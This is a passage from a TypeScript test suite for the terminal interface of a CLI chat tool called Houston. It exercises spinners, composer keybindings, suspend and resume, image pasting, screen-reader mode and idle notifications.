    t.io.stopSpinner!()
  })

  it('paints the reduced-motion spinner atomically too: the still mark, at the slow pace', () => {
    const t = harness(true)
    t.io.setAccessibility!({ reduceMotion: true })
    t.io.startSpinner!('Working')
    t.tick()
    const out = t.text()
    expect(out).toContain(`${SYNC_BEGIN}\r\x1b[2K`)
    expect(out).toContain('• Working')
    expect(out).not.toMatch(/[⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏]/)
    expect(count(out, SYNC_BEGIN)).toBe(count(out, SYNC_END))
    t.io.stopSpinner!()
  })

  it('is off when the output is not the terminal', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('abc\r')
    await read
    t.io.startSpinner!('Working')
    t.tick()
    t.io.stopSpinner!()
    expect(t.text()).not.toContain(SYNC_BEGIN)
    expect(t.text()).not.toContain(SYNC_END)
  })
})

describe('composer: drafts, images, rewind and suspend', () => {
  function harness(over: Parameters<typeof createTerminalIo>[0] = {}) {
    const stdin = fakeTty()
    const written: string[] = []
    const remembered: string[] = []
    let history: string[] = []
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => clock,
      history: () => history,
      remember: (t) => {
        remembered.push(t)
        history = [...history, t]
      },
      schedule: () => () => {},
      ...over
    })
    return {
      io,
      stdin,
      written,
      remembered,
      text: () => written.join(''),
      tick: (ms = 500) => {
        clock += ms
      }
    }
  }

  it('Ctrl-C keeps the discarded draft in history, and Up brings it back', async () => {
    const t = harness()
    let interrupts = 0
    t.io.onInterrupt!(() => interrupts++)
    const first = t.io.readComposer!('> ')
    t.stdin.push('a draft I did not mean to lose')
    t.stdin.push('\x03')
    await expect(first).resolves.toBeNull()
    expect(interrupts).toBe(1)
    expect(t.remembered).toEqual(['a draft I did not mean to lose'])
    const second = t.io.readComposer!('> ')
    t.stdin.push('\x1b[A')
    t.stdin.push('\r')
    await expect(second).resolves.toBe('a draft I did not mean to lose')
  })

  it('Ctrl-C on an empty composer remembers nothing', async () => {
    const t = harness()
    t.io.onInterrupt!(() => {})
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x03')
    await read
    expect(t.remembered).toEqual([])
  })

  it('Esc Esc clears the draft into history; a slow second Esc does not', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('keep typing')
    t.tick()
    t.stdin.push('\x1b')
    t.tick(700) // past the double-press window
    t.stdin.push('\x1b')
    expect(t.remembered).toEqual([])
    t.tick(100)
    t.stdin.push('\x1b')
    expect(t.remembered).toEqual(['keep typing'])
    t.tick()
    t.stdin.push('\x1b[A\r')
    await expect(read).resolves.toBe('keep typing')
  })

  it('Esc Esc on an empty composer closes the read and asks for rewind', async () => {
    const t = harness()
    let rewinds = 0
    t.io.onRewindKey!(() => rewinds++)
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b')
    t.tick(100)
    t.stdin.push('\x1b')
    await expect(read).resolves.toBeNull()
    expect(rewinds).toBe(1)
  })

  it('in vim mode, Esc Esc from insert only reaches normal mode; again from normal opens rewind', async () => {
    const t = harness({ editorMode: () => 'vim' })
    let rewinds = 0
    t.io.onRewindKey!(() => rewinds++)
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b')
    t.tick(100)
    t.stdin.push('\x1b') // first press left insert; this is the first in normal
    expect(rewinds).toBe(0)
    t.tick(100)
    t.stdin.push('\x1b')
    await expect(read).resolves.toBeNull()
    expect(rewinds).toBe(1)
  })

  it('in vim mode, Esc Esc never clears text', async () => {
    const t = harness({ editorMode: () => 'vim' })
    t.io.onRewindKey!(() => {})
    const read = t.io.readComposer!('> ')
    t.stdin.push('words')
    t.tick()
    for (let i = 0; i < 3; i++) {
      t.stdin.push('\x1b')
      t.tick(100)
    }
    expect(t.remembered).toEqual([])
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('words')
  })

  it('a Ctrl-S stash survives into the next read, with a hint on the empty prompt', async () => {
    const t = harness()
    const first = t.io.readComposer!('> ')
    t.stdin.push('the long question')
    t.stdin.push('\x13')
    t.stdin.push('quick one\r')
    await expect(first).resolves.toBe('quick one')
    const second = t.io.readComposer!('> ')
    expect(t.text()).toContain('stashed draft: Ctrl-S brings it back')
    t.stdin.push('\x13')
    t.stdin.push('\r')
    await expect(second).resolves.toBe('the long question')
  })

  it('Ctrl-V attaches the clipboard image and leaves the draft alone', async () => {
    const t = harness()
    const reqs: unknown[] = []
    t.io.onImagePaste!((req) => {
      reqs.push(req)
      return { handled: true, notes: ['· attached the image from your clipboard (1 staged)'] }
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('what is this')
    t.stdin.push('\x16')
    expect(reqs).toEqual([{ kind: 'clipboard' }])
    expect(t.text()).toContain('attached the image from your clipboard')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('what is this')
  })

  it('says so when there is no image handler', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1bv')
    expect(t.text()).toContain('pasting images is unavailable here')
    t.stdin.push('\r')
    await read
  })

  it('a pasted image path attaches it instead of inserting text', async () => {
    const t = harness()
    const reqs: unknown[] = []
    t.io.onImagePaste!((req) => {
      reqs.push(req)
      return { handled: true, notes: ['· attached shot.png (1 staged)'] }
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push("\x1b[200~'/tmp/my shot.png'\x1b[201~")
    expect(reqs).toEqual([{ kind: 'files', paths: ['/tmp/my shot.png'] }])
    t.tick()
    t.stdin.push('describe it\r')
    await expect(read).resolves.toBe('describe it')
  })

  it('pastes as text when the driver says the paths are not images after all', async () => {
    const t = harness()
    t.io.onImagePaste!(() => ({ handled: false, notes: [] }))
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b[200~/tmp/nope.png\x1b[201~')
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('/tmp/nope.png')
  })

  it('pastes ordinary text without asking about images', async () => {
    const t = harness()
    let asked = 0
    t.io.onImagePaste!(() => {
      asked++
      return { handled: true, notes: [] }
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b[200~see shot.png for details\x1b[201~')
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('see shot.png for details')
    expect(asked).toBe(0)
  })

  it('Ctrl-Z at the composer hands the terminal back, then takes it again on resume', async () => {
    let resume: (() => void) | null = null
    const t = harness({ platform: 'darwin', suspendProcess: (cb) => (resume = cb) })
    const read = t.io.readComposer!('> ')
    t.stdin.push('draft')
    const before = t.written.length
    t.stdin.push('\x1a')
    const handedBack = t.written.slice(before).join('')
    expect(handedBack).toContain('\x1b[?2004l') // bracketed paste off
    expect(handedBack).toContain('\x1b[>4;0m') // modified keys off
    expect(t.stdin.rawModes.at(-1)).toBe(false) // cooked mode for the shell
    expect(resume).not.toBeNull()
    const mid = t.written.length
    resume!()
    const retaken = t.written.slice(mid).join('')
    expect(retaken).toContain('\x1b[?2004h')
    expect(retaken).toContain('draft') // repainted
    expect(t.stdin.rawModes.at(-1)).toBe(true)
    // Keys still arrive exactly once after resuming.
    t.stdin.push('!\r')
    await expect(read).resolves.toBe('draft!')
  })

  it('Ctrl-Z resets the vim cursor shape and restores it on resume', async () => {
    let resume: (() => void) | null = null
    const t = harness({ platform: 'linux', editorMode: () => 'vim', suspendProcess: (cb) => (resume = cb) })
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b') // normal mode: block cursor
    const before = t.written.length
    t.stdin.push('\x1a')
    expect(t.written.slice(before).join('')).toContain('\x1b[0 q')
    const mid = t.written.length
    resume!()
    expect(t.written.slice(mid).join('')).toContain('\x1b[2 q')
    t.stdin.push('\r')
    await read
  })

  it('Ctrl-Z while a turn runs suspends without stopping the run', () => {
    let resume: (() => void) | null = null
    let interrupts = 0
    const t = harness({ platform: 'linux', suspendProcess: (cb) => (resume = cb) })
    t.io.onInterrupt!(() => interrupts++)
    t.io.startSpinner!('Working')
    const before = t.written.length
    t.stdin.push('\x1a')
    expect(t.written.slice(before).join('')).toContain('\x1b[?1004l') // focus reporting off
    expect(t.stdin.rawModes.at(-1)).toBe(false)
    expect(interrupts).toBe(0)
    resume!()
    expect(t.stdin.rawModes.at(-1)).toBe(true)
    // Watching again: typing still lands in the mid-run draft.
    t.stdin.push('more\r')
    expect(t.io.takeQueued!()).toEqual(['more'])
    t.io.stopSpinner!()
  })

  it('Ctrl-Z on Windows is a note, not a suspend', async () => {
    let suspends = 0
    const t = harness({ platform: 'win32', suspendProcess: () => suspends++ })
    const read = t.io.readComposer!('> ')
    t.stdin.push('x\x1a')
    expect(suspends).toBe(0)
    expect(t.text()).toContain('not available on Windows')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('x')
    t.io.startSpinner!('Working')
    t.stdin.push('\x1a')
    expect(suspends).toBe(0)
    t.io.stopSpinner!()
  })
})

/**
 * Screen-reader mode: a screen reader follows text as it is written, so a redraw
 * (cursor up, erase, reprint) reads as noise on every key. Nothing in this mode may
 * move the cursor, erase, or rewind a line.
 */
describe('screen-reader mode', () => {
  const ESC = String.fromCharCode(27)
  /** Cursor movement and erase: CSI A-H, J, K, S, T, plus save/restore, and a bare CR. */
  const REDRAW = new RegExp(`${ESC}\\[[0-9;]*[ABCDEFGHJKSTfsu]|${ESC}[78]|\\r(?!\\n)`)

  function harness(over: Parameters<typeof createTerminalIo>[0] = {}) {
    const stdin = fakeTty()
    const written: string[] = []
    let ticks: Array<() => void> = []
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => clock,
      schedule: (fn) => {
        ticks.push(fn)
        return () => {
          ticks = ticks.filter((t) => t !== fn)
        }
      },
      paint: (s) => `${ESC}[36m${s}${ESC}[0m`,
      ...over
    })
    io.setAccessibility!({ screenReader: true, reduceMotion: true })
    return {
      io,
      stdin,
      text: () => written.join(''),
      scheduled: () => ticks.length,
      tick: (ms = 500) => {
        clock += ms
      }
    }
  }

  it('reads the composer append-only, a multi-line paste included, with no redraw escapes', async () => {
    const t = harness()
    const read = t.io.readComposer!('you: ')
    t.stdin.push('fix ')
    t.stdin.push('thx')
    t.stdin.push('\x7f') // Backspace
    t.stdin.push('is:')
    t.stdin.push(`${ESC}[200~line one\nline two${ESC}[201~`)
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('fix this:line one\nline two')
    const text = t.text()
    expect(text).not.toMatch(REDRAW)
    expect(text).toContain('you: fix thx\b \bis:line one\nline two\n')
    // Bracketed paste is on while it reads, and off again after.
    expect(text).toContain('[?2004h')
    expect(text.lastIndexOf('[?2004l')).toBeGreaterThan(text.lastIndexOf('[?2004h'))
  })

  // Out of the screen-reader session's own loop (a background session ending), a notice
  // is a plain appended line: no erase-and-redraw of the open composer around it.
  it('prints a notice that arrives while the composer is open plainly, with no redraw escapes', async () => {
    const t = harness()
    const read = t.io.readComposer!('you: ')
    t.stdin.push('please refactor')
    const mark = t.text().length
    t.io.out('\n· background session "fix tests" finished\n')
    const after = t.text().slice(mark)
    // Just the notice as plain text (the bullet dropped, as every plain line is).
    expect(after).toBe('\nbackground session "fix tests" finished\n')
    expect(after).not.toContain(ESC)
    expect(after).not.toMatch(REDRAW)
    t.tick()
    t.stdin.push(' the parser\r')
    await expect(read).resolves.toBe('please refactor the parser')
  })

  it('restates the prompt on a new line for history, instead of rewriting the line', async () => {
    const t = harness({ history: () => ['older message'] })
    const read = t.io.readComposer!('you: ')
    t.stdin.push(`${ESC}[A`) // Up
    t.stdin.push('\r')
    await expect(read).resolves.toBe('older message')
    expect(t.text()).toContain('you: \nyou: older message\n')
    expect(t.text()).not.toMatch(REDRAW)
  })

  it('prints spinner states once as lines, and never animates or erases', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.io.setSpinnerLabel!('Retrying 1 of 3')
    t.io.setSpinnerLabel!('Retrying 1 of 3') // a repeat says nothing
    t.io.setStatus!('model · main')
    t.io.out(`${ESC}[2mresult${ESC}[0m\n`)
    t.io.stopSpinner!()
    expect(t.scheduled()).toBe(0)
    expect(t.text()).not.toMatch(REDRAW)
    expect(t.text().split('retrying').length).toBe(2)
    expect(t.text()).toContain('working\n')
    // Output loses its color codes.
    expect(t.text()).toContain('result\n')
    expect(t.text()).not.toContain(`${ESC}[2m`)
  })

  it('answers a picker by number, re-asking on a number not on the list', async () => {
    const t = harness()
    const picked = t.io.select!({
      title: 'Choose:',
      escLabel: 'deny',
      options: [
        { label: 'Allow', value: 'allow' },
        { label: 'Deny', value: 'deny' }
      ]
    })
    t.stdin.push('5\r')
    await new Promise((r) => setImmediate(r))
    t.stdin.push('2\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: 'deny' })
    const text = t.text()
    expect(text).toContain('1. Allow\n2. Deny\n')
    expect(text).toContain('There is no option 5. Choose 1 to 2.')
    expect(text).not.toMatch(REDRAW)
    expect(text).not.toContain('↑')
  })

  it('hands a typed answer at a picker back as text', async () => {
    const t = harness()
    const picked = t.io.select!({ title: '', options: [{ label: 'Allow', value: 'allow' }] })
    t.stdin.push('n, use the other file')
    t.tick() // a burst of text is treated like a paste; a human pauses before Enter
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'type', text: 'n, use the other file' })
  })

  it('reads a sub-prompt append-only, and Ctrl-C cancels it', async () => {
    const t = harness()
    let interrupted = 0
    t.io.onInterrupt!(() => interrupted++)
    const answer = t.io.readLine('Trust this folder? [y/N/never] ', { discardPending: true })
    t.stdin.push('y\x03')
    await expect(answer).resolves.toBeNull()
    expect(interrupted).toBe(1)
    expect(t.text()).not.toMatch(REDRAW)
  })

  it('mid-run typing is not drawn, and Enter says where the line went', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('also check docs\r')
    expect(t.io.takeQueued!()).toEqual(['also check docs'])
    expect(t.text()).toContain('queued for after this turn (1 waiting)')
    expect(t.text()).not.toContain('also check docs')
    expect(t.text()).not.toMatch(REDRAW)
    t.io.stopSpinner!()
  })

  it('prints the transcript as plain lines instead of opening the full-screen viewer', async () => {
    const t = harness()
    const source: PagerSource = {
      title: 'My chat',
      render: () => ({ lines: ['\x1b[1mdoc line\x1b[0m'], prompts: [0] }),
      plain: () => 'My chat\n\nyou: go\nhouston: done\n'
    }
    await expect(t.io.pager!(source)).resolves.toBe(true)
    const text = t.text()
    expect(text).toContain('you: go\nhouston: done\n\nend of transcript\n')
    expect(text).not.toContain('[?1049h')
    expect(text).not.toMatch(REDRAW)
  })

  it('Ctrl-O at the composer hands off to the driver, then states the prompt again with the draft', async () => {
    const t = harness()
    let opened = 0
    t.io.onTranscript!(async (during) => {
      expect(during).toBe('composer')
      opened++
      t.io.out('the transcript\n')
    })
    const read = t.io.readComposer!('you: ')
    t.stdin.push('half')
    t.tick()
    t.stdin.push('\x0f')
    await new Promise((r) => setImmediate(r))
    expect(opened).toBe(1)
    t.stdin.push(' done')
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('half done')
    const text = t.text()
    // Bracketed paste and modified keys go off for the handoff and back on after.
    const modes = new RegExp(`${ESC}\\[[?>][0-9;]*[hlm]`, 'g')
    expect(text.replace(modes, '')).toContain('you: half\nthe transcript\nyou: half done\n')
    expect(text).not.toMatch(REDRAW)
    expect(text).not.toContain('[?1049h')
  })

  it('clearLine writes nothing', () => {
    const t = harness()
    t.io.clearLine!()
    expect(t.text()).toBe('')
  })

  it('turning it on takes a running spinner down first, then never draws again', () => {
    const stdin = fakeTty()
    const written: string[] = []
    let ticks: Array<() => void> = []
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => 1000,
      schedule: (fn) => {
        ticks.push(fn)
        return () => {
          ticks = ticks.filter((t) => t !== fn)
        }
      }
    })
    io.startSpinner!('Working')
    expect(ticks.length).toBe(1)
    io.setAccessibility!({ screenReader: true })
    expect(ticks.length).toBe(0)
    const before = written.length
    io.setStatus!('x')
    io.setMode!('ask')
    expect(written.length).toBe(before)
    io.stopSpinner!()
  })

  it('attaches a clipboard image and a pasted image path as plain lines, with no redraw escapes', async () => {
    const t = harness()
    const reqs: unknown[] = []
    t.io.onImagePaste!((req) => {
      reqs.push(req)
      return {
        handled: true,
        notes: [req.kind === 'clipboard' ? '· attached the image from your clipboard (1 staged)' : '· attached shot.png (2 staged)']
      }
    })
    const read = t.io.readComposer!('you: ')
    t.stdin.push('what is')
    t.stdin.push('\x16') // Ctrl-V
    t.stdin.push(`${ESC}[200~'/tmp/shot.png'${ESC}[201~`)
    t.tick()
    t.stdin.push(' this\r')
    // The draft is untouched: the path was not inserted as text.
    await expect(read).resolves.toBe('what is this')
    expect(reqs).toEqual([{ kind: 'clipboard' }, { kind: 'files', paths: ['/tmp/shot.png'] }])
    const text = t.text()
    expect(text).toContain('you: what is\nattached the image from your clipboard (1 staged)\nyou: what is\n')
    expect(text).toContain('\nattached shot.png (2 staged)\nyou: what is this\n')
    expect(text).not.toMatch(REDRAW)
    expect(text).not.toContain('[?1049h')
  })

  it('Ctrl-Z suspends and resumes with the prompt and draft restated, with no redraw escapes', async () => {
    let resume: (() => void) | null = null
    const t = harness({ platform: 'darwin', suspendProcess: (cb) => (resume = cb) })
    const read = t.io.readComposer!('you: ')
    t.stdin.push('half')
    const before = t.text().length
    t.stdin.push('\x1a')
    expect(resume).not.toBeNull()
    expect(t.stdin.rawModes.at(-1)).toBe(false) // cooked for the shell
    expect(t.text().slice(before)).toContain('[?2004l')
    resume!()
    expect(t.stdin.rawModes.at(-1)).toBe(true)
    // Keys arrive exactly once after resuming.
    t.stdin.push(' done\r')
    await expect(read).resolves.toBe('half done')
    const text = t.text()
    expect(text).toContain('you: half\n')
    // The prompt is stated again after resuming, the draft with it.
    expect(text).toMatch(new RegExp(`you: half\\n(${ESC}\\[[^a-z]*[a-z])*you: half done\\n`))
    expect(text).not.toMatch(REDRAW)
    expect(text).not.toContain('[?1049h')
  })

  it('Ctrl-Z on Windows says it is unavailable as a plain line', async () => {
    let suspends = 0
    const t = harness({ platform: 'win32', suspendProcess: () => suspends++ })
    const read = t.io.readComposer!('you: ')
    t.stdin.push('x\x1a')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('x')
    expect(suspends).toBe(0)
    expect(t.text()).toContain('not available on Windows')
    expect(t.text()).not.toMatch(REDRAW)
  })

  it('Esc Esc clears the draft into history, and on an empty composer asks for rewind', async () => {
    const remembered: string[] = []
    const t = harness({ remember: (s) => remembered.push(s) })
    let rewinds = 0
    t.io.onRewindKey!(() => rewinds++)
    const read = t.io.readComposer!('you: ')
    t.stdin.push('oops')
    t.tick()
    t.stdin.push(ESC)
    t.tick(100)
    t.stdin.push(ESC)
    expect(remembered).toEqual(['oops'])
    t.tick(100)
    t.stdin.push(ESC)
    t.tick(100)
    t.stdin.push(ESC)
    await expect(read).resolves.toBeNull()
    expect(rewinds).toBe(1)
    const text = t.text()
    expect(text).toContain('(cleared)')
    expect(text).not.toMatch(REDRAW)
  })

  it('Ctrl-G opens the draft in the editor and states the edited text on a new line', async () => {
    const seen: string[] = []
    const t = harness({
      editText: async (initial) => {
        seen.push(initial)
        return 'edited text\n'
      }
    })
    const read = t.io.readComposer!('you: ')
    t.stdin.push('draft')
    t.stdin.push('\x07') // Ctrl-G
    await new Promise((r) => setImmediate(r))
    expect(seen).toEqual(['draft'])
    t.stdin.push('\r')
    await expect(read).resolves.toBe('edited text')
    expect(t.text()).toContain('\nyou: edited text\n')
    expect(t.text()).not.toMatch(REDRAW)
  })

  it('ignores undo, redo and the stash without writing anything', async () => {
    const t = harness()
    const read = t.io.readComposer!('you: ')
    t.stdin.push('abc')
    const before = t.text().length
    t.stdin.push('\x1f') // Ctrl-_ undo
    t.stdin.push('\x1e') // Ctrl-^ redo
    t.stdin.push('\x13') // Ctrl-S stash
    expect(t.text().length).toBe(before)
    t.stdin.push('\r')
    await expect(read).resolves.toBe('abc')
  })

  it('Ctrl-C keeps the discarded draft in history', async () => {
    const remembered: string[] = []
    const t = harness({ remember: (s) => remembered.push(s) })
    t.io.onInterrupt!(() => {})
    const read = t.io.readComposer!('you: ')
    t.stdin.push('a draft')
    t.stdin.push('\x03')
    await expect(read).resolves.toBeNull()
    expect(remembered).toEqual(['a draft'])
  })
})

describe('notification modes and the idle reminder', () => {
  const alert = { title: 'Houston', body: 'Finished' }
  const reminder = { title: 'Houston', body: 'Houston is waiting for your next message' }

  function harness() {
    const stdin = fakeTty()
    const written: string[] = []
    let timers: Array<{ fn: () => void; ms: number }> = []
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => clock,
      schedule: () => () => {},
      timeout: (fn, ms) => {
        const t = { fn, ms }
        timers.push(t)
        return () => {
          timers = timers.filter((x) => x !== t)
        }
      }
    })
    return {
      io,
      stdin,
      text: () => written.join(''),
      clear: () => (written.length = 0),
      pending: () => timers.map((t) => t.ms),
      fire: () => {
        const due = timers
        timers = []
        due.forEach((t) => t.fn())
      },
      tick: (ms = 500) => {
        clock += ms
      }
    }
  }

  it('sends only what the mode asks for', () => {
    const t = harness()
    t.io.signal!({ alert, mode: 'bell' })
    expect(t.text()).toBe('\x07')
    t.clear()
    t.io.signal!({ alert, mode: 'osc' })
    // No bell in front: the only BELs are the OSC terminators.
    expect(t.text().startsWith('\x1b]9;Houston: Finished')).toBe(true)
    expect(t.text()).toContain(']777;notify;')
  })

  it('reminds once, about a minute after a turn ends unwatched', () => {
    const t = harness()
    t.io.remindIfIdle!(reminder, 'auto')
    expect(t.pending()).toEqual([60_000])
    // It asks for focus reports, so coming back can cancel it.
    expect(t.text()).toContain('[?1004h')
    t.clear()
    t.fire()
    expect(t.text()).toContain('\x07')
    expect(t.text()).toContain('Houston is waiting for your next message')
    expect(t.text()).toContain('[?1004l')
    expect(t.pending()).toEqual([])
  })

  it('a keystroke at the composer cancels it', async () => {
    const t = harness()
    t.io.remindIfIdle!(reminder, 'bell')
    const read = t.io.readComposer!('> ')
    t.stdin.push('h')
    expect(t.pending()).toEqual([])
    t.clear()
    t.fire()
    expect(t.text()).not.toContain('\x07')
    t.tick()
    t.stdin.push('\r')
    await read
  })

  it('coming back to the window cancels it, and a focused window never arms it', async () => {
    const t = harness()
    t.io.remindIfIdle!(reminder, 'auto')
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b[I') // focus in
    expect(t.pending()).toEqual([])
    t.io.remindIfIdle!(reminder, 'auto')
    expect(t.pending()).toEqual([])
    t.tick()
    t.stdin.push('\r')
    await read
  })

  it('a new turn cancels it, and off never arms it', () => {
    const t = harness()
    t.io.remindIfIdle!(reminder, 'osc')
    t.io.startSpinner!('Working')
    expect(t.pending()).toEqual([])
    t.io.stopSpinner!()
    t.io.remindIfIdle!(reminder, 'off')
    expect(t.pending()).toEqual([])
  })

  it('arming again replaces the earlier reminder rather than stacking', () => {
    const t = harness()
    t.io.remindIfIdle!(reminder, 'auto')
    t.io.remindIfIdle!(reminder, 'auto', 1000)
    expect(t.pending()).toEqual([1000])
  })
})
